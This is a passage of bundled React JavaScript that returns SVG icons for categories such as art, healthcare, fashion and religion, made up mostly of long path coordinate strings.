        d: "M21.0659 12.159C20.9727 12.4386 20.9793 12.7419 21.0846 13.0172C21.1899 13.2925 21.3874 13.5227 21.6435 13.6687C21.8996 13.8147 22.1983 13.8674 22.4889 13.8178C22.7794 13.7682 23.0438 13.6194 23.2369 13.3967C23.43 13.1741 23.54 12.8914 23.548 12.5967C23.5561 12.3021 23.4617 12.0138 23.281 11.7809C23.1003 11.5481 22.8444 11.3851 22.557 11.3197C22.2696 11.2543 21.9684 11.2906 21.7048 11.4224C21.5549 11.4969 21.4212 11.6003 21.3116 11.7267C21.2019 11.8532 21.1184 12.0001 21.0659 12.159ZM21.8716 12.4276C21.9027 12.3344 21.9651 12.2548 22.0483 12.2025C22.1314 12.1501 22.2302 12.1283 22.3276 12.1405C22.4251 12.1528 22.5153 12.1985 22.5829 12.2699C22.6504 12.3412 22.6911 12.4338 22.6981 12.5318C22.7051 12.6298 22.6778 12.7272 22.6211 12.8073C22.5643 12.8875 22.4814 12.9455 22.3867 12.9715C22.2919 12.9974 22.1911 12.9897 22.1014 12.9496C22.0117 12.9096 21.9386 12.8397 21.8947 12.7518C21.8696 12.702 21.8546 12.6476 21.8507 12.592C21.8467 12.5363 21.8539 12.4805 21.8716 12.4276Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.3525 10.7319C20.6322 10.8251 20.9354 10.8185 21.2107 10.7131C21.486 10.6078 21.7163 10.4103 21.8622 10.1542C22.0082 9.89816 22.0609 9.5994 22.0113 9.30886C21.9617 9.01831 21.8129 8.75396 21.5902 8.56083C21.3675 8.36771 21.0848 8.25777 20.7901 8.24974C20.4955 8.24171 20.2072 8.3361 19.9743 8.51681C19.7415 8.69752 19.5785 8.95338 19.5132 9.24079C19.4478 9.52821 19.4841 9.82939 19.6159 10.093C19.7673 10.395 20.0322 10.6247 20.3525 10.7319ZM20.3525 9.38887C20.3836 9.29567 20.4461 9.21613 20.5292 9.16381C20.6124 9.11148 20.7111 9.08961 20.8086 9.10192C20.906 9.11423 20.9962 9.15995 21.0638 9.2313C21.1313 9.30265 21.172 9.39521 21.179 9.49321C21.1859 9.59121 21.1587 9.68859 21.1019 9.76876C21.0451 9.84892 20.9622 9.90691 20.8675 9.93285C20.7727 9.95878 20.6719 9.95105 20.5822 9.91099C20.4925 9.87092 20.4194 9.80098 20.3755 9.7131C20.3505 9.66327 20.3355 9.60895 20.3316 9.55331C20.3276 9.49766 20.3348 9.44179 20.3526 9.38892L20.3525 9.38887Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.0964 14.651C18.2091 14.8764 18.386 15.0633 18.605 15.1881C18.8239 15.3128 19.0748 15.3699 19.3262 15.352C19.5775 15.3342 19.8179 15.2422 20.017 15.0877C20.216 14.9332 20.3648 14.7232 20.4445 14.4841C20.5242 14.2451 20.5312 13.9878 20.4646 13.7447C20.3981 13.5017 20.2609 13.2839 20.0706 13.1188C19.8802 12.9537 19.6452 12.8488 19.3952 12.8173C19.1452 12.7857 18.8915 12.8291 18.6661 12.9417C18.5157 13.0157 18.3815 13.1188 18.2712 13.2451C18.161 13.3714 18.0769 13.5183 18.0239 13.6773C17.9709 13.8363 17.95 14.0043 17.9625 14.1714C17.9749 14.3386 18.0204 14.5016 18.0964 14.651ZM19.0459 13.7014C19.121 13.6639 19.2056 13.6494 19.2889 13.6599C19.3723 13.6704 19.4506 13.7054 19.5141 13.7604C19.5775 13.8154 19.6232 13.8881 19.6454 13.9691C19.6676 14.0501 19.6653 14.1358 19.6387 14.2155C19.6122 14.2952 19.5626 14.3652 19.4962 14.4167C19.4299 14.4682 19.3498 14.4989 19.266 14.5048C19.1822 14.5108 19.0986 14.4918 19.0256 14.4502C18.9526 14.4086 18.8936 14.3463 18.856 14.2712C18.8058 14.1704 18.7976 14.0538 18.8332 13.947C18.8688 13.8402 18.9453 13.7518 19.0459 13.7013V13.7014Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M17.7187 12.3164C17.9958 12.316 18.2653 12.2253 18.4862 12.058C18.707 11.8906 18.8674 11.6558 18.9428 11.3892C19.0182 11.1225 19.0046 10.8386 18.9041 10.5803C18.8036 10.3221 18.6216 10.1037 18.3858 9.95817C18.1499 9.81267 17.8731 9.74804 17.5972 9.77407C17.3213 9.80009 17.0615 9.91536 16.857 10.1024C16.6525 10.2894 16.5146 10.538 16.4642 10.8105C16.4137 11.083 16.4535 11.3645 16.5774 11.6123C16.6827 11.8248 16.8455 12.0034 17.0472 12.1279C17.249 12.2523 17.4817 12.3177 17.7187 12.3164ZM17.5267 10.6627C17.6018 10.6251 17.6864 10.6107 17.7697 10.6212C17.853 10.6317 17.9314 10.6666 17.9948 10.7217C18.0583 10.7767 18.104 10.8493 18.1262 10.9303C18.1484 11.0113 18.1461 11.0971 18.1195 11.1768C18.0929 11.2564 18.0434 11.3265 17.977 11.378C17.9107 11.4295 17.8305 11.4601 17.7468 11.4661C17.663 11.4721 17.5793 11.453 17.5064 11.4115C17.4334 11.3699 17.3744 11.3076 17.3368 11.2325C17.3116 11.1826 17.2965 11.1283 17.2924 11.0726C17.2884 11.0169 17.2953 10.961 17.313 10.908C17.3306 10.855 17.3586 10.8061 17.3953 10.764C17.432 10.7219 17.4766 10.6874 17.5267 10.6627Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.0829 14.9308H12.5075C12.6202 14.9308 12.7282 14.886 12.8078 14.8064C12.8875 14.7267 12.9322 14.6187 12.9322 14.5061C12.9322 14.3935 12.8875 14.2854 12.8078 14.2058C12.7282 14.1262 12.6202 14.0814 12.5075 14.0814H12.0829C11.9702 14.0814 11.8622 14.1262 11.7826 14.2058C11.7029 14.2854 11.6582 14.3935 11.6582 14.5061C11.6582 14.6187 11.7029 14.7267 11.7826 14.8064C11.8622 14.886 11.9702 14.9308 12.0829 14.9308Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M14.2064 14.9308H14.6311C14.7437 14.9308 14.8517 14.886 14.9314 14.8064C15.011 14.7267 15.0557 14.6187 15.0557 14.5061C15.0557 14.3935 15.011 14.2854 14.9314 14.2058C14.8517 14.1262 14.7437 14.0814 14.6311 14.0814H14.2064C14.0938 14.0814 13.9858 14.1262 13.9061 14.2058C13.8265 14.2854 13.7817 14.3935 13.7817 14.5061C13.7817 14.6187 13.8265 14.7267 13.9061 14.8064C13.9858 14.886 14.0938 14.9308 14.2064 14.9308Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M15.3679 3.5324C15.4022 3.57639 15.4448 3.61321 15.4933 3.64074C15.5418 3.66828 15.5953 3.68599 15.6506 3.69287C15.7059 3.69975 15.7621 3.69566 15.8159 3.68083C15.8696 3.66601 15.9199 3.64074 15.9639 3.60647C16.0079 3.5722 16.0447 3.5296 16.0723 3.48111C16.0998 3.43261 16.1175 3.37916 16.1244 3.32382C16.1313 3.26848 16.1272 3.21232 16.1124 3.15856C16.0975 3.10479 16.0723 3.05448 16.038 3.01048C15.7206 2.60207 15.314 2.27158 14.8494 2.04425C14.3847 1.81691 13.8743 1.69873 13.357 1.69873C12.8398 1.69873 12.3293 1.81691 11.8647 2.04425C11.4001 2.27158 10.9935 2.60207 10.6761 3.01048C10.6069 3.09934 10.5758 3.21205 10.5897 3.32382C10.6036 3.43559 10.6613 3.53726 10.7501 3.60647C10.839 3.67568 10.9517 3.70676 11.0635 3.69287C11.1753 3.67898 11.2769 3.62125 11.3461 3.5324C11.5842 3.22595 11.8891 2.97796 12.2376 2.80736C12.5861 2.63677 12.969 2.54809 13.357 2.54809C13.7451 2.54809 14.128 2.63677 14.4765 2.80736C14.825 2.97796 15.1299 3.22595 15.3679 3.5324Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M16.7095 2.48908C16.7787 2.57794 16.8803 2.63566 16.9921 2.64955C17.1039 2.66345 17.2166 2.63237 17.3055 2.56316C17.3943 2.49395 17.452 2.39228 17.4659 2.28051C17.4798 2.16874 17.4487 2.05602 17.3795 1.96717C16.9031 1.35466 16.2931 0.859048 15.596 0.518132C14.8989 0.177216 14.1331 0 13.3571 0C12.5812 0 11.8154 0.177216 11.1183 0.518132C10.4212 0.859048 9.8112 1.35466 9.33476 1.96717C9.26555 2.05602 9.23447 2.16874 9.24836 2.28051C9.26225 2.39228 9.31998 2.49395 9.40883 2.56316C9.49769 2.63237 9.6104 2.66345 9.72217 2.64955C9.83394 2.63566 9.93562 2.57794 10.0048 2.48908C10.4019 1.97858 10.9102 1.5655 11.4912 1.28135C12.0721 0.9972 12.7103 0.849492 13.357 0.849492C14.0038 0.849492 14.6419 0.9972 15.2229 1.28135C15.8038 1.5655 16.3122 1.97858 16.7093 2.48908H16.7095Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M13.3571 3.39735C13.0984 3.39665 12.843 3.45541 12.6106 3.56911C12.3782 3.68281 12.175 3.84839 12.0167 4.05308C11.9486 4.14202 11.9184 4.25428 11.9327 4.36539C11.9469 4.47651 12.0045 4.57749 12.0929 4.64634C12.1813 4.71519 12.2933 4.74632 12.4045 4.73296C12.5158 4.71959 12.6172 4.66282 12.6868 4.575C12.7661 4.47279 12.8677 4.39007 12.9839 4.33317C13.1001 4.27626 13.2278 4.24668 13.3571 4.24668C13.4865 4.24668 13.6142 4.27626 13.7304 4.33317C13.8466 4.39007 13.9482 4.47279 14.0275 4.575C14.0971 4.66282 14.1985 4.71959 14.3098 4.73296C14.421 4.74632 14.533 4.71519 14.6214 4.64634C14.7098 4.57749 14.7674 4.47651 14.7816 4.36539C14.7959 4.25428 14.7657 4.14202 14.6976 4.05308C14.5393 3.84839 14.3361 3.68281 14.1037 3.56911C13.8713 3.45541 13.6159 3.39665 13.3571 3.39735Z"
      }));
    case "art":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "23",
        height: "21",
        viewBox: "0 0 23 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "art"), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.44538 13.4721C6.12718 13.2206 5.72837 13.0822 5.32243 13.0822C4.77075 13.0822 4.25702 13.3273 3.91293 13.7548C3.61205 14.129 3.47583 14.5972 3.52952 15.073C3.58329 15.5498 3.82115 15.9769 4.19921 16.2757C4.51741 16.5272 4.91609 16.6657 5.32195 16.6657C5.87405 16.6657 6.38785 16.4201 6.73167 15.9922C7.03227 15.6186 7.16835 15.1509 7.11486 14.6753C7.06124 14.1985 6.82351 13.7712 6.44538 13.4721ZM6.09109 15.4772C5.90398 15.7102 5.62358 15.8439 5.32195 15.8439C5.0971 15.8439 4.88506 15.7703 4.70891 15.631C4.50406 15.4691 4.3753 15.2383 4.34619 14.9809C4.31729 14.7245 4.39084 14.4719 4.55323 14.27C4.74041 14.0374 5.02081 13.904 5.32243 13.904C5.54749 13.904 5.7596 13.9776 5.93569 14.1168C6.14047 14.2787 6.26916 14.5097 6.29813 14.7673C6.32696 15.0234 6.25354 15.2755 6.09109 15.4772Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M13.6718 9.26315C13.9429 9.26315 14.205 9.20377 14.4515 9.08631C14.8872 8.87783 15.2145 8.51313 15.373 8.05932C15.5305 7.60839 15.5022 7.12314 15.2933 6.69337C14.9945 6.07738 14.3563 5.67932 13.6675 5.67932C13.3959 5.67932 13.1332 5.73891 12.8868 5.8565C12.4512 6.0643 12.1238 6.42873 11.9651 6.88268C11.8072 7.33395 11.8355 7.81926 12.0447 8.24924C12.3445 8.86516 12.9832 9.26315 13.6718 9.26315ZM12.7408 7.15396C12.8267 6.90843 13.0042 6.71104 13.2406 6.59824C13.3757 6.53386 13.5192 6.50119 13.6674 6.50119C14.0435 6.50119 14.3914 6.71741 14.5539 7.05239C14.6666 7.28416 14.6818 7.54545 14.597 7.78831C14.5112 8.03398 14.3335 8.23164 14.0973 8.34465C13.9628 8.40882 13.8195 8.44128 13.6717 8.44128C13.2953 8.44128 12.9467 8.22472 12.7836 7.8896C12.6711 7.65818 12.6558 7.39696 12.7408 7.15396Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.19954 6.35895C9.33172 6.38881 9.46699 6.40395 9.60157 6.40395C10.4475 6.40395 11.1703 5.83179 11.3593 5.01177C11.4656 4.5468 11.3839 4.06813 11.1295 3.66377C10.873 3.25625 10.4721 2.97298 10.0011 2.86628C9.86834 2.83614 9.73252 2.8208 9.59733 2.8208C8.75189 2.8208 8.02988 3.39358 7.84147 4.21346C7.73435 4.67809 7.81551 5.15683 8.06995 5.56146C8.32665 5.96952 8.72792 6.25279 9.19954 6.35895ZM8.64245 4.39783C8.74457 3.95327 9.13728 3.64274 9.59733 3.64274C9.67122 3.64274 9.74581 3.65116 9.81916 3.66781C10.0761 3.72602 10.2944 3.88005 10.4339 4.10155C10.5712 4.31982 10.6153 4.57803 10.5582 4.82788C10.4575 5.2649 10.0551 5.58208 9.6015 5.58208C9.52781 5.58208 9.4535 5.57372 9.38035 5.55722C9.12331 5.49934 8.90504 5.34545 8.76566 5.12395C8.62855 4.90582 8.58478 4.64802 8.64245 4.39783Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M5.93448 7.38422C6.31213 7.085 6.54958 6.65755 6.60328 6.18066C6.65677 5.70521 6.52095 5.23757 6.22022 4.86328C5.87558 4.43597 5.36143 4.19092 4.80975 4.19092C4.40423 4.19092 4.00582 4.32899 3.68756 4.58C3.30984 4.87834 3.07225 5.3051 3.01835 5.78165C2.96452 6.25772 3.10067 6.72618 3.40196 7.10109C3.74632 7.52887 4.26054 7.77427 4.81283 7.77427C5.2187 7.7742 5.6171 7.63572 5.93448 7.38422ZM4.04247 6.58585C3.87974 6.38339 3.80611 6.13053 3.83515 5.87383C3.86419 5.61679 3.99281 5.38626 4.19691 5.22497C4.37299 5.08607 4.58497 5.01265 4.80982 5.01265C5.11172 5.01265 5.39273 5.1462 5.58005 5.37845C5.74202 5.58022 5.81544 5.83247 5.78661 6.08868C5.75764 6.34648 5.62888 6.57783 5.42417 6.74002C5.2489 6.87884 5.03748 6.95226 4.8129 6.95226C4.51066 6.95233 4.22985 6.81864 4.04247 6.58585Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M22.7408 3.36294C22.6697 3.2913 22.543 3.2059 22.3431 3.2059C22.1087 3.2059 21.4859 3.2059 17.7037 6.42434C17.6276 6.48899 17.5509 6.55454 17.4739 6.62056C16.7982 4.85772 15.6108 3.2861 14.0809 2.14931C12.3266 0.845897 10.2377 0.156554 8.04011 0.156006C8.03943 0.156006 8.03895 0.156006 8.0384 0.156006C6.55534 0.156006 4.75257 0.674195 3.3334 1.5086C1.59378 2.53128 0.635888 3.89901 0.636231 5.35968C0.636778 7.12313 1.63138 7.86076 2.43058 8.4534C3.08225 8.93673 3.59695 9.31842 3.59722 10.1549C3.59743 10.9914 3.08301 11.3728 2.43167 11.8556C1.63275 12.4479 0.638354 13.1851 0.638902 14.9488C0.639313 16.4092 1.59782 17.7773 3.33779 18.8009C4.75798 19.6363 6.56171 20.1556 8.04505 20.156C8.04607 20.156 8.04696 20.156 8.04792 20.156C10.7399 20.156 13.2705 19.117 15.1738 17.2301C17.0529 15.3674 18.098 12.8985 18.1254 10.2675C18.7635 9.54142 19.3816 8.81975 19.9459 8.13972C20.9113 6.97636 21.6536 6.01642 22.1523 5.28667C22.813 4.32008 23.1023 3.72724 22.7408 3.36294ZM14.5953 16.6465C12.8468 18.3798 10.5219 19.3341 8.04799 19.3341C8.04724 19.3341 8.04614 19.3341 8.04539 19.3341C5.39438 19.3334 1.46152 17.4916 1.46077 14.9485C1.46036 13.5988 2.16991 13.0727 2.92117 12.5158C3.62339 11.9951 4.4193 11.405 4.41902 10.1547C4.41861 8.90454 3.62249 8.31409 2.92007 7.79323C2.16847 7.2358 1.45851 6.70932 1.4581 5.35947C1.45776 3.79785 2.89384 2.72038 3.74995 2.21705C5.03056 1.46415 6.71369 0.977807 8.0384 0.977807C8.03888 0.977807 8.03943 0.977807 8.03984 0.977807C10.0597 0.978355 11.9791 1.61161 13.5908 2.80893C15.0771 3.91332 16.2117 5.46364 16.8093 7.1956C15.0269 8.75194 13.0967 10.5464 11.6593 11.9885C9.27182 12.2975 8.94657 13.8886 8.70877 15.0575C8.50632 16.0528 8.37489 16.534 7.60665 16.5957C7.41734 16.6109 7.26317 16.7537 7.23365 16.9413C7.20407 17.1289 7.30687 17.3123 7.48234 17.3849C7.53172 17.4053 8.70672 17.8855 10.0795 17.8855C10.0797 17.8855 10.0799 17.8855 10.08 17.8855C11.0367 17.8855 11.8573 17.6536 12.519 17.1963C13.3345 16.6328 13.8874 15.7393 14.1652 14.5412C15.1044 13.591 16.1776 12.4452 17.2388 11.2649C16.9945 13.297 16.0775 15.1771 14.5953 16.6465ZM13.3396 14.4634C12.9041 16.189 11.8085 17.0638 10.0799 17.0637C10.0799 17.0637 10.0797 17.0637 10.0795 17.0637C9.62372 17.0637 9.18724 17.0015 8.82028 16.924C9.25861 16.477 9.39551 15.8043 9.51407 15.2215C9.73988 14.1114 9.95343 13.0609 11.7004 12.8113L13.3396 14.4634ZM19.0143 7.97336C17.3853 9.91414 15.4135 12.0936 13.7903 13.7507L13.539 13.4974L12.4303 12.3799C13.902 10.9149 15.7899 9.16808 17.5514 7.63934C17.7567 7.46113 17.9608 7.28518 18.1619 7.11368C20.2061 5.37029 21.2774 4.61157 21.8238 4.28138C21.4975 4.83114 20.7457 5.9106 19.0143 7.97336Z"
      }));
    case "healthcare":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "28",
        height: "21",
        viewBox: "0 0 28 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "healthcare"), /*#__PURE__*/React__default.createElement("path", {
        d: "M27.4934 9.74042H25.1817C26.1427 7.5586 26.0388 5.79237 25.6752 4.59756C25.0518 2.46769 22.9479 0.156006 19.831 0.156006C18.9999 0.156006 18.1687 0.31185 17.3116 0.623538C15.831 1.16899 14.844 1.7664 14.4025 2.07808C13.9609 1.7664 12.9999 1.16899 11.4934 0.623538C10.6362 0.31185 9.77909 0.156006 8.97389 0.156006C5.85701 0.156006 3.75311 2.46769 3.12974 4.59756C2.7661 5.87029 2.63623 7.79237 3.85701 10.208H1.05181C0.818049 10.208 0.63623 10.3898 0.63623 10.6235C0.63623 10.8573 0.818049 11.0391 1.05181 11.0391H4.35052C4.48039 11.2729 4.63623 11.5067 4.81805 11.7404C7.51935 15.6365 13.3895 19.8703 14.4544 20.13V20.156C14.4544 20.156 14.4804 20.156 14.5064 20.13C14.5323 20.13 14.5583 20.13 14.5843 20.13V20.1041C15.4934 19.6625 21.1297 16.0261 24.0908 11.7144C24.3765 11.3248 24.6103 10.9352 24.818 10.5456H27.5453C27.7791 10.5456 27.9609 10.3638 27.9609 10.13C27.9609 9.89627 27.7271 9.74042 27.4934 9.74042ZM23.3375 11.2729C20.5843 15.2989 15.5193 18.5456 14.4284 19.2469C13.3116 18.5456 8.27259 15.2729 5.49337 11.2729C5.44143 11.195 5.38948 11.117 5.33753 11.0391H9.15571C9.31155 11.0391 9.4674 10.9612 9.54532 10.8054L11.2856 7.37679L14.0129 14.3638C14.0648 14.5196 14.2466 14.6235 14.4025 14.6235C14.4025 14.6235 14.4025 14.6235 14.4284 14.6235C14.6103 14.6235 14.7661 14.4937 14.818 14.3119L17.2077 6.13003L18.4804 10.2599C18.5323 10.4157 18.6622 10.5196 18.818 10.5456C18.9739 10.5716 19.1297 10.4937 19.2336 10.3638L20.2466 8.88328L21.1038 10.3378C21.1817 10.4677 21.3116 10.5456 21.4674 10.5456H23.8051C23.6492 10.8054 23.4934 11.0391 23.3375 11.2729ZM24.2726 9.74042H21.7271L20.6622 7.92224C20.5843 7.79237 20.4544 7.71445 20.2986 7.71445C20.1427 7.71445 20.0129 7.7664 19.9349 7.89627L19.0518 9.19497L17.6232 4.54562C17.5713 4.3638 17.3895 4.2599 17.2077 4.23393C17.0258 4.23393 16.844 4.3638 16.7921 4.54562L14.3765 12.8833L11.7531 6.18198C11.7012 6.02614 11.5453 5.92224 11.3895 5.92224C11.2077 5.92224 11.0778 6.00016 10.9999 6.15601L8.94792 10.182H4.81805C3.77909 8.28588 3.49337 6.46769 3.96091 4.83133C4.50636 2.98717 6.29857 1.01315 8.99987 1.01315C9.72714 1.01315 10.4804 1.16899 11.2336 1.42873C13.1297 2.13003 14.1427 2.93523 14.1687 2.93523C14.3245 3.0651 14.5323 3.0651 14.6882 2.93523C14.6882 2.93523 15.7012 2.13003 17.6232 1.42873C18.3765 1.14302 19.1297 1.01315 19.857 1.01315C22.5323 1.01315 24.3505 2.98717 24.896 4.83133C25.3375 6.33782 25.1038 8.00016 24.2726 9.74042Z"
      }));
    case "fashion":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "21",
        viewBox: "0 0 21 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "fashion"), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.1296 18.028C19.8206 17.6657 19.3651 17.4611 18.8919 17.4473C18.1167 17.3855 17.6621 16.4831 18.0833 15.8234L20.1172 12.6373C20.6374 11.8225 20.3162 10.7483 19.4843 10.2948C19.6167 10.0869 19.7032 9.94681 19.732 9.89216C20.0885 9.21511 19.8207 8.35313 19.1436 7.99697C18.4587 7.63669 17.6081 7.90053 17.2477 8.58508C17.224 8.62994 17.1739 8.73947 17.102 8.90237L16.5174 8.56885C16.1199 8.34397 15.9435 7.85066 16.1772 7.43736C16.3625 7.10944 15.8554 6.82276 15.6699 7.15061C15.2885 7.82549 15.5507 8.71516 16.2327 9.07722L16.8683 9.43983C16.5244 10.2388 15.992 11.4997 15.4165 12.8699C15.0092 12.1375 14.5965 11.4068 14.4125 10.5809C13.9439 8.47827 15.0135 6.49355 16.1216 4.82934C16.4239 4.37534 16.4874 3.95268 16.3106 3.57306C15.8912 2.6731 14.2225 2.37726 12.8155 2.22003C11.9932 2.12814 11.9577 1.58768 11.9577 0.900524C11.9577 -0.0941663 9.2001 -0.0901658 9.2001 0.900524C9.2001 1.55983 9.18895 2.12705 8.38011 2.21463C6.91538 2.37287 5.18188 2.66957 4.77448 3.56712C4.66406 3.81041 4.60712 4.20716 4.96309 4.71534C5.64512 5.68906 6.12716 6.56696 6.43672 7.39918C6.6021 7.84371 6.71788 8.27813 6.78542 8.70102L6.29165 8.7119C6.28788 8.71197 6.28412 8.71213 6.28031 8.71236C4.03389 8.84943 2.42121 9.49646 1.48707 10.6356C0.812307 11.4583 0.52458 12.5385 0.675396 13.679V17.8031C0.675396 18.3336 1.03074 18.9202 1.62593 19.3722C2.29137 19.8776 3.18943 20.156 4.1546 20.156C6.26462 20.156 8.19671 18.4434 8.27793 18.3705C8.33945 18.3152 8.37464 18.2364 8.37464 18.1537V18.1463H9.64319V19.8409C9.64319 20.2176 10.2258 20.2176 10.2258 19.8409V18.1463H10.932V19.8409C10.932 20.2176 11.5146 20.2176 11.5146 19.8409V18.1463H13.21C12.8405 19.0328 12.5872 19.6416 12.546 19.7407C12.4162 20.0529 12.8711 20.2932 13.0573 20.0142C13.1271 19.9097 13.6166 19.1757 14.3018 18.1463H15.8206C16.2664 18.1463 16.6292 17.7821 16.6292 17.3345C16.6292 16.4983 16.5393 15.7516 16.3548 15.0565C17.4385 13.4223 18.5278 11.7729 19.1684 10.7852C19.7093 11.1064 19.9997 11.7385 19.626 12.3239L17.5922 15.5099C16.9367 16.5366 17.6366 17.9316 18.8455 18.028C19.5184 18.0508 19.9349 18.5541 19.9349 19.1997V19.8525C19.9349 20.2291 20.5175 20.2291 20.5175 19.8525V19.2108C20.549 18.7781 20.4114 18.3585 20.1296 18.028ZM1.45503 11.8158V12.7759C1.45503 13.1525 2.03763 13.1525 2.03763 12.7759V10.8892C2.21862 10.6882 2.42688 10.5055 2.66229 10.3414V10.8343C2.66229 11.2109 3.24489 11.2109 3.24489 10.8343V10.0001C3.47094 9.88902 3.71509 9.79056 3.97679 9.70461V11.3797C3.97679 11.7563 4.55939 11.7563 4.55939 11.3797V9.54078C4.78649 9.48683 5.02489 9.44104 5.27397 9.40298V10.0584C5.27397 10.435 5.85657 10.435 5.85657 10.0584V9.3305C6.18783 9.29811 6.51564 9.28968 6.84792 9.28238C6.91903 10.6145 6.37586 11.7293 5.74665 12.8601C3.69555 13.0558 2.38936 13.8904 1.9013 14.7056C1.47554 14.3555 1.25799 13.9498 1.25799 13.661C1.25799 13.6595 1.2578 13.658 1.25776 13.6565C1.25768 13.6514 1.25733 13.6463 1.25698 13.6412C1.25664 13.6361 1.25629 13.6309 1.25566 13.6259C1.25547 13.6244 1.25547 13.6229 1.25528 13.6215C1.18777 13.1285 1.1887 12.4744 1.45503 11.8158ZM4.1546 15.4313C3.43323 15.4313 2.84266 15.2653 2.38707 15.0258C2.56084 14.7167 2.90403 14.4044 3.36289 14.1442C3.77175 13.9123 4.44081 13.627 5.41119 13.4863C5.13865 14.0256 4.8905 14.6235 4.72621 15.3738C4.53737 15.4106 4.34624 15.4313 4.1546 15.4313ZM1.25799 17.8032V14.9026C1.44544 15.0992 1.66201 15.2703 1.89303 15.413V16.2225C1.89303 16.5991 2.47563 16.5991 2.47563 16.2225V15.7047C2.70657 15.7966 2.95122 15.8683 3.20551 15.9198V17.6734C3.20551 18.05 3.78811 18.05 3.78811 17.6734V16.0003C4.03089 16.0183 4.27559 16.0196 4.51799 15.9937V16.6335C4.51799 17.0101 5.10058 17.0101 5.10058 16.6335V15.8857C5.36101 15.8174 5.61401 15.725 5.85637 15.6173V19.1958C5.33083 19.4144 4.74594 19.5734 4.1546 19.5734C2.25284 19.5734 1.25799 18.4209 1.25799 17.8032ZM7.79204 18.019C7.59104 18.1848 7.09241 18.5731 6.43897 18.9201V15.3203C6.99407 15.0014 7.46365 14.6309 7.79204 14.3423V18.019ZM8.37464 17.5637V13.661C8.37464 13.4013 8.04597 13.2729 7.86956 13.4631C7.85535 13.4784 6.74499 14.6622 5.37208 15.1862C5.61117 14.298 5.98342 13.6304 6.34564 12.9823C6.72285 12.3075 7.11292 11.6096 7.31396 10.7075C7.55636 9.61974 7.44492 8.43831 6.98277 7.19601C6.65566 6.31675 6.15113 5.39598 5.44028 4.38109C5.20029 4.03848 5.27909 3.86491 5.305 3.80785C5.45201 3.484 6.11567 3.04515 8.44268 2.79382C9.56508 2.67256 9.7827 1.87315 9.7827 0.900486C9.7827 0.767459 11.3751 0.776975 11.3751 0.900486C11.3751 1.90186 11.6032 2.6705 12.7508 2.79898C13.1322 2.84159 13.8422 2.92094 14.487 3.0925C15.3898 3.33272 15.6898 3.62021 15.7825 3.81911C15.8142 3.88724 15.9108 4.09457 15.6366 4.50642C14.4604 6.2729 13.3276 8.39112 13.8438 10.7075C14.0753 11.7465 14.6379 12.6295 15.1275 13.5584C14.5388 14.9622 13.9313 16.4168 13.453 17.5638H8.37464V17.5637ZM16.0466 17.3345C16.0466 17.4609 15.9452 17.5637 15.8206 17.5637H14.6895C15.0663 16.9974 15.4822 16.3716 15.9091 15.7285C16.0013 16.2259 16.0466 16.7566 16.0466 17.3345ZM14.2427 17.1835C15.7604 13.5466 17.5901 9.18501 17.7631 8.85646C17.9697 8.46425 18.4802 8.30625 18.8724 8.51253C19.2607 8.71675 19.4229 9.22878 19.2166 9.62059C19.1907 9.66981 19.1078 9.80342 18.9793 10.0046L18.5405 9.75238L18.6527 9.54703C18.8333 9.21654 18.3222 8.93705 18.1415 9.26758L17.647 10.1722C17.4709 10.4945 17.9796 10.7784 18.1582 10.4517L18.261 10.2637L18.6631 10.4948C17.728 11.9343 15.8019 14.8392 14.2427 17.1835Z"
      }));
    case "religion":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "21",
        viewBox: "0 0 21 21",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "religion"), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.6687 19.1132H9.14047V14.3398C9.14047 14.1753 9.00715 14.042 8.8427 14.042C8.67824 14.042 8.54492 14.1753 8.54492 14.3398V19.4109C8.54492 19.5754 8.67824 19.7087 8.8427 19.7087H12.6687C12.8332 19.7087 12.9665 19.5754 12.9665 19.4109C12.9665 19.2465 12.8332 19.1132 12.6687 19.1132Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M16.8761 7.04763H12.9671V4.04411C12.9671 3.87966 12.8339 3.74634 12.6694 3.74634H8.84336C8.67891 3.74634 8.54559 3.87966 8.54559 4.04411V7.04763H4.63664C4.47219 7.04763 4.33887 7.18095 4.33887 7.3454V11.1714C4.33887 11.3359 4.47219 11.4692 4.63664 11.4692H8.54559V13.347C8.54559 13.5115 8.67891 13.6448 8.84336 13.6448C9.00781 13.6448 9.14113 13.5115 9.14113 13.347V11.1714C9.14113 11.007 9.00781 10.8736 8.84336 10.8736H4.93441V7.64317H8.84336C9.00781 7.64317 9.14113 7.50985 9.14113 7.3454V4.34188H12.3716V7.3454C12.3716 7.50985 12.5049 7.64317 12.6694 7.64317H16.5783V9.08735C16.5783 9.25181 16.7116 9.38513 16.8761 9.38513C17.0406 9.38513 17.1739 9.25181 17.1739 9.08735V7.3454C17.1739 7.18095 17.0406 7.04763 16.8761 7.04763Z"
      }), /*#__PURE__*/React__default.createElement("path", {
